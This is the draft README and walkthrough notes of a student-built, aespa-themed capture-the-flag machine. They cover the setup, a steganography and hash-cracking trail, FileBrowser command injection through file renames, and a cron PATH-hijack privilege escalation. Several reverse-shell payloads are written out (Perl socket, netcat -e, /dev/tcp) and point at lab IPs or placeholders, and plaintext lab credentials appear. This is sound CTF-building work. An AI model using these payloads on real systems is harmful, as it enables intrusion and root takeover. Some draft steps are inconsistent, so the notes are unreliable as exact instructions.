# TODO 
Juntar o tutorial nesse readme e nesse projeto do overleaf
https://www.overleaf.com/1673643711dfmmppvcmzhw#8aa075
Em um tutorial bem formatado de como conseguir root shell na maquina 

# Build & run 
```
docker compose build --no-cache && docker compose up -d
```
or 
```

sudo docker build -t who-ae-you . && \

sudo docker run -d \
  --name who-ae-you \
  --hostname who-ae-you \
  -p 93:80 \
  -p 48:21 \
  -p 8080:8080 \
  -p 30000-30010:30000-30010 \
  who-ae-you

```

or if alr built
```
# Stop and remove the container (ignore errors if it doesn't exist)
sudo docker rm -f who-ae-you

# Remove the old image
sudo docker rmi who-ae-you

# Rebuild without using the build cache
sudo docker build --no-cache -t who-ae-you .

# Run it again
sudo docker run -d \
  --name who-ae-you \
  --hostname who-ae-you \
  -p 93:80 \
  -p 48:21 \
  -p 8080:8080 \
  -p 30000-30010:30000-30010 \
  who-ae-you
```



go to localhost:97 to find post-auth code injection vulnerability
- MUST: login as admin, go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.

- FTP port 48
- file-broswer port 93

# Resolvendo CTF
If firefox cant see video
go to `about:config`
search `media.gmp-gmpopenh264.enabled` &  set to `true`
also `media.ffmpeg.enabled` = `true`

## Index.html
1. acesse index.html , exiftool no video. ou melhor, burpsuite p descobrir de onde vem arquive 
2. encontre /scene1 

## /scene1
3. 1. strings no gif, usar linha mais curta `lessence` (se [e q escreve assim])
3. 1. exiftool no video de scene1 
```
    Encoder                         :  $ 6$<yummy>$
    XMP Toolkit                     : Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//
    Artist                          : YWVzcGFGaWxlcw==
```
3. 2. decodando:
```
$ echo -n "YWVzcGFGaWxlcw==" | base64 -d
aespaFiles
```
3. 3.  Quebra de hash (nota que a senha esta em rockyou)
``
```
$ hashid -m '$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
[+] SHA-512 Crypt [Hashcat Mode: 1800]
...

$ hashcat -m 1800 -a 0 hash.txt p.txt 
...
Candidates.#1....: cooper -> cooper
...

```
## /run
4. Baixar tdas imagens e run `strings <image>`
5. Decodar a mensagem escondida em base64
6. a ningning (cisne) tem 2 hashes. essas serao as passphrases p steghide dps
6. 1. simples, jogar no crackstation.com SHA512
6. 2. bcrypt
```
# supernovaflyingbakekang esta na rockyou
$ echo "supernovaflyingbakekang" > wordlist.txt

# Create a file for the hash (use SINGLE quotes to prevent $ expansion)
$ echo '$2y$10$QeZOHz29PR59KijGcxR/bu0BcqKvWo23IY7lduxbKiwqIJ8aBjtvq' > hash.txt

hashcat -m 3200 -a 0 hash.txt wordlist.txt
```

## Ftp 
6.  Pegar credenciais do video extra[ido do clipe ]
```
$ binwalk -e complaexity_trailer.mp4 
# senha da ningning em /run
$steghide extract -sf extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg -p "complexity"
wrote extracted data to "who_are_they.txt".
```
6. 1. Em `who_are_they.txt`
```
  user: complexity
  password: complexitytrailer
  Port of file-browser
```
 <!-- todo fix complexity trailer maybe (colocar /orig/who_are_you.txt na imagem com steghide, e a imagem no video ) -->

7. Qual essa port?
```
# escaneia todas portas abaixo de 1000
# segue dica da karina em /run
$ sudo nmap -sS -p-1000 target_ip
# ou todas ports
$ sudo nmap -sS -p- -Pn --min-rate 1000 <targe
```
<!-- TODO execute & colar resultado  -->

## File browser 
<!-- (users criados em `entry.sh`, ver credenciais la) -->
<!-- Lembrar que é necessário um admin ter setado um comando vulnerável depois de uma ação válida para  user da atacante
usaremos `sh -c "echo this old filename has been changed and is now deprecated: \$FILE"` . Admin armageddon senha em entry.sh-->
8. Login de 6.1. Essa versão de file browser tem CVE. 
    Note um arquivo MKV (lossless format). 
    Steghide funciona pra imagem, áudio, não vídeo. 
    Mkv permite extrair áudio sem perder dados.
    Extrai-se o áudio e aplica steghide passphrase `supernovaflyingbakekang`(ningning \run).
```
TODO
```
    Eventualmente isso leva à `sh -c "echo this old filename has been changed and is now deprecated: \$FILE" ` 

## Initial Foothold
9. Renomeia arquivo duas vezes. o nome é a reverse shell
<!-- todo encontrar um comando q entregue uma revshell menos insuportavel -->
```
; perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```
10. strings no gif.


## Priviledge Escalation
11. Explorar git em `supernova`
12. encontrar uma senha no HISTóRICO do git. Deve estar em files deletados
13. Usar sudo p ler um arquivo, descobre cronjob a cana X min

```
sudo cat /etc/cr
on.d/wda4
```

14. then execute path hijack. espere que o processo cron automaticamente roda.
```
mkdir singularity 
cd singularity 
echo '#!/bin/bash' > singularity
echo 'bash -i >& /dev/tcp/192.168.15.14/4441 0>&1' >> singularity
chmod +x singularity
export PATH=/home/supernova/singularity:$PATH
echo $PATH
```
----
# Bash prompt: singularity runs randomly before each prompt

---
## steganography nas midias


echo -n "aespaFiles" | base64

exiftool -Artist="YWVzcGFGaWxlcw==" -xmptoolkit="Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//"   -Encoder=" $ 6$<yummy>$ "  strange_phenomenon_aeri.mp4



no video em scene1

$ strings SALTy_and_sweet.gif 
...
;l'existence precede l'essence==
lexistence


echo -n 'cooper' | openssl passwd -6 -salt 'lexistence' -stdin
$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//

$ hashid -m '$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
Analyzing '$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
[+] SHA-512 Crypt [Hashcat Mode: 1800]


hashcat -m 1800 -a 0 hash.txt p.txt 
...
Candidates.#1....: cooper -> cooper
...


echo -n "YWVzcGFGaWxlcw==" | base64 -d





echo -n "lexistence" | md5sum | awk '{print $1}'
f8821d1fa146c69a894aa8260c5a645a

$6$lexistence$.p80vCBfUGUh5riTd3kzq9SrYJwrQGYuhOQDbbXG3R5cV2N8m3HxxJ3gPdUv7eSRKziL.nOBRtjtklu0


insere string base 64
echo "SGkgYWVzcGEuIEkgZG9uJ3Qga25vdyBpZiB5b3UncmUgdGhlIHJlYWwsIHRoZSBmYWtlLCB0aGUgQUkgYWVzcGEgb3Igd2hhdGV2ZXIsIEknbGwgbGV0IHlvdSBsaXZlIGlmIHlvdSBjYW4gbWFrZSB0aHJvdWdoIHRoaXMgY2hhbGxlbmdlLg==" >> app/media/Welcome.mp4 
echo "You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality." >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
echo "RG8geW91IHJlbWVtYmVyIGhvdyBpdCB3YXMsIHdoZW4gYWxsIG9mIHRoaXMgbWVzcyBiZWdhbj8gVGhhdCdzIC9zY2VuZTEgb2YgdGhpcyBzdG9yeSAgIA==" >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"

Hi aespa. I don't know if you're the real, the fake, the AI aespa or whatever, I'll let you live if you can make through this challenge. 
You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality.
Do you remember how it was, when all of this mess began? That's /scene1 of this story   

to delete 
sed -i '$d' "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"




scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool

echo -n "cooper" | openssl kdf -keylen 32 -kdfopt digest:SHA256 -kdfopt pass:stdin -kdfopt salt:"l\`existence precede l\`essence" -kdfopt iter:600000 PBKDF2 | base64
MDE6QkI6MTE6QjM6ODE6Mzg6NjA6MjQ6QzM6REM6QkU6QkU6MkU6MDg6N0U6NzM6NzQ6QUI6QzY6
MkQ6NzQ6RDY6NzI6QzY6MEU6RjY6OEY6Q0E6RUE6Qjg6OEI6N0QKCg==


'$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'

exiftool


ftp: user aespa password cooper
    todo: binwalk coloca link/dica do filebrowser ('see port 97' )




cat > who_are_they.txt << 'EOF'
  user: complexity
  password: complexitytrailer
  Port of file-browser
EOF

<!-- inside PortOfSelf.jpg steghide who_are_they.txt password is complexity --> 
steghide embed -cf PortOfSelf.jpg -ef who_are_they.txt -p "complexity" -sf port_of_self.jpg

<!-- inside ComplæxityTrailer.mp4 binwalk "PortOfSelf.jpg" -->
cat complaexity_trailer.mp4 port_of_self.jpg > "complaexity.mp4"


### ftp

steghide embed -cf PortOfSelf.jpg -ef who_are_they.txt
cat complaexity.mp4 PortOfSelf.jpg > complaexity_trailer.mp4


binwalk -e complaexity.mp4
steghide extract -sf extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg -p "complexity"
wrote extracted data to "who_are_they.txt".


steghide embed -cf "PortOfSelf.jpg" -ef secret.txt -p "complexity"
cat "aespa 에스파  LEMONADE Complæxity Trailer .webm" "PortOfSelf.jpg" > ae_glitch.webm
binwalk -e ae_glitch.webm


### file-browser
cp "rich_man_trailer.webm" rich_man_trailer_combined.webm
cat whats_happenning.txt >> rich_man_trailer_combined.webm


### run
base64 /run 


ningning
hashes: 
    complexity (complaexity, sha512, can be cracked in crackstation)
    supernovaflyingbakekang  (richman?, bcrypt, not in crackstation)

winter 
Angel #48 is expecting guests, she's like our dear Nævis protecting the new POS. Aeri can introduce you


Karina
Our Beautiful Creature was flying under 1000m


```
# Create a wordlist file containing your password
echo "supernovaflyingbakekang" > wordlist.txt

# Create a file for the hash (use SINGLE quotes to prevent $ expansion)
echo '$2y$10$QeZOHz29PR59KijGcxR/bu0BcqKvWo23IY7lduxbKiwqIJ8aBjtvq' > hash.txt

hashcat -m 3200 -a 0 hash.txt wordlist.txt

```

# Create a wordlist file containing your password
echo "qwer" > wordlist.txt

# Create a file for the hash (use SINGLE quotes to prevent $ expansion)
echo '$2y$10$QeZOHz29PR59KijGcxR/bu0BcqKvWo23IY7lduxbKiwqIJ8aBjtvq' > hash.txt

### TODO
bunch of steghide password hashes somewhere, /run ?
complexity, flowers, 

in file browser, a flowers gif w an audio 
that winter reflection in mirror 

steghide flowers in richman

## foothold: CVE-2026-35585  no file-browser
- rename um arquivo pra `; nc 192.168.15.14 4443 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
- rename pra
```
perl -e 'use Socket;$i="192.168.15.14";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

pra sair da dumb shell
```
exec /bin/bash -i
```

CLUE
- download rich_man.mkv, extract audio, run steghide w rockyou (supernovaflyingbakekang )
- decode base64 string into `sh -c "echo this old filename has been changed and is now deprecated: \$FILE"` this is ran after every rename

/bin/bash -c 'echo "this old filename has been changed and is now deprecated: $FILE"'

reverses this
```
ffmpeg -i rich_man_trailer.mp4 -an -c:v copy rich_man.mp4
ffmpeg -i rich_man_trailer.mp4 -vn -acodec pcm_s16le audio.wav
steghide embed -cf audio.wav -ef foothold_b64.txt -p supernovaflyingbakekang
ffmpeg -i rich_man.mp4 -i audio.wav \
    -c:v copy \
    -c:a pcm_s16le \
    rich_man.mkv

cat whats_happenning.txt >> rich_man.mkv
```
by doing
```
$ffmpeg -i rich_man.mkv -map 0:a -c copy audio.wav
$steghide extract -sf audio.wav -p supernovaflyingbakekang
wrote extracted data to "foothold_b64.txt".
$cat foothold_b64.txt | base64 -d
sh -c "echo this old filename has been changed and is now deprecated: \$FILE"
```
### Payload
rename any file with a revshell 
```
; nc <ATTACKER_IP> 4444 -e sh #
```
then rename it agani to anything.

remember: for this to work, an admin has to have set that `sh ... echo` command after every rename. 

## PE
after login as supernova 

explore until sudo password is found in .git old file history
```
```

explore until cronjob is found 
```
$ sudo  cat  /etc/cron.d/wda4
PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:
* * * * * root singularity >> /var/log/singularity.log 2>&1
```

then execute path hijack
```
cd singularity
echo '#!/bin/bash' > singularity
echo 'bash -i >& /dev/tcp/192.168.15.14/4441 0>&1' >> singularity
chmod +x singularity
export PATH=/home/supernova/singularity:$PATH
echo $PATH
```

which echo
# Should output: /tmp/echo
```
## Credenciais
- file browser na localhost:97
```
    filebrowser users add armageddon armageddonarmageddon \
        --database "$DB" \
        --perm.admin
        
    filebrowser users add complexity complexitytrailer \
    ```

# TODO
- arrumar o character encoding no apache (acento ~ ` etc)
ftp: binwalk na imagem leva a um login 
- Colocar um video em index ou alterar a imagem (insira a string base64 notada neste readme), para colocar intrucoes explicando o CTF :
- - Sit back and relax. The story will be told to you. 
- - Entenda esta narrativa linearmente.
- - adicionar dicas  pra motivar as outras regras
- - deixar o 'light ... run...'
- - - adicionar em /run uma imagem com dica facil (comando strings) pra porta do FTP 'see port <FTP_PORT>'
~~bruteforce no login  (user winter password flowers )~~ (ja tem bruteforce no hash da senha em scene1, pra acessar ftp)


- add steghide ningning  SHA 256
    I won't make you search every picture here, because if you can search one of them, you can search all of them.
    If you found this message, what can truly help you is this: walk through door number 48? .
    easy rockyou 

- add binwalk to winter (flowers video, fowers has steghide w password flowers )
    password to steghid in ftp OP fucking steganography 
    inside the portal pic, there is a big file, inside it there's some 
        flie is big so it's easily noticeable 
        big file strings just gives you the credentials to file browser 
        if file browser RCE then we're FUCKED
        do this: FTP in common port ? nah

- winter
- - binwalk flowers video named ae-ningning_kermit_dance.mp4 (video can be found from this name, big hint, easy)
- - flowers video has steghide password flowers (rockyou)
no need for thorough binwalk, this is an easy version. for FTP 

- karina pic:
 -  - this is a tutorial for your near future 

if they find FTP they find filebrowser: 
put fb info inside images in FTP 
🔍 Why it works against tools: steghide, stegseek scan pixel data; they never look past EOI. binwalk might flag trailing data as “raw”, but without the key and the knowledge to extract it properly, it’s just random noise.

    ⚠️ Be aware: the appended data can be stripped by re‑encoding the image. But for a CTF where the image is served as‑is, this is excellent.

how would they even find that if they dont know 

bash

# create a payload file
echo "secret info" > payload.txt
# encrypt with a strong key (e.g., AES-256)
openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
# append the encrypted blob to a JPEG
cat cover.jpg payload.enc > hidden.jpg

Extract
bash

# find the offset of the raw encrypted data (after FFD9)
dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
# or use binwalk / hex editor; then decrypt
openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"

- portal pic 
- flowers vid inside 




bash

# create a payload file
echo "secret info" > payload.txt
# encrypt with a strong key (e.g., AES-256)
openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
# append the encrypted blob to a JPEG
cat cover.jpg payload.enc > hidden.jpg

Extract
bash

# find the offset of the raw encrypted data (after FFD9)
dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
# or use binwalk / hex editor; then decrypt
openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"




- hide file-browser link in FTP 


# Problemas
cuidado pra nao usar nginx, ou qqr csa q introduz unauthenticated RCE 


nota: flower e cooper estao na rockyou.txt


# Misc NOtes

there is a process running as root, a script 
the script calls a command by name 
user will try to 

its in folder or process /armageddon
script is synk 
synk echoes something like ' You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality ' 

would be cool if synk was a crontab -- is that on theme with cron or not? 

supernova non root user can create a file to path hijack, but supernova whole filesys is locked by sudo write (is it possible to lock this do they may ONLY write if they got SUDO password?)

supernova doesnt actually get to run anything as root despite having a sudo -- is this possible? if not, give them sudo only for the specific commands for file write & read


for consider that the story of this ctf follows aespa's story 

ctf starts as giselle in scene 1

the ae are born, lexistence precedes lessence

a strange phenomenon is happening

the ae copied aespa looks and are living their own lives releasing music 

the ae and the aespa are all copied 

winter realizes that theyve been living in a fake world and to reach reality they must destroy parts and embrace hidden parts (can be a reference to git) of  themselves (steal root)


this is the official lore 
Armageddon’s lore is about aespa bringing destruction upon themselves in order to destroy the artificial world they exist in. WDA are the 4 horses of the apocalypse bringing destruction

WINTER merging with the giant eye and growing wings symbolizes awakening, while the collapsing AI city represents destruction of that fake controlled reality

The hip hop versions of aespa represent theirselves trapped in the system while the bizarre superhuman versions are their future evolved selves

aespa lore explained by Karina

Karina: The aespa in reality and the fake aespa keeps getting mixed together, the reason is that in reality, us, the Armageddon aespa, Dirty Work aespa, Whiplash aespa etc the aespas that should be in different worlds have banded together in one place. For example, there are four more of me here, so it gets confusing right? So a rupture forms in this world






| Technical Concept    | Story Meaning                 |
| -------------------- | ----------------------------- |
| Current files        | Present identity              |
| History              | Forgotten memories            |
| Deleted content      | Repressed self                |
| Branches             | Alternate selves              |
| Merge                | Accepting multiple identities |
| Root                 | New, merged, real reality. original root is one thing, but achieving PE root is like merging hidden parts and compromising the previous fake               |
| Privilege escalation | Reaching the truth            |
| Enumeration          | Self-discovery                |
| Hidden files         | Suppressed memories           |


change user names in machine image: 
- aespa: the one serving website
- WTMW: file browser
- supernova: ftp
- armageddon: root 



# Walkthrough

## index.html
```
exiftool ../app/media/welcome.mp4 
...
Encoder                         : Lavf60.16.100
Comment                         : /scene0
XMP Toolkit                     : Image::ExifTool 12.76
Artist                          : You wanna watch a drama? A Drama can be written from anyone's life, seek your own story
```


## In /home/supernova
```
$ strings ning_forgot_the_password_flag.gif 

omg hi congrats on getting user flag{these superbeings are destroying the whole world} I was going to steghide embed it without password but it felt mean (too guessy)
```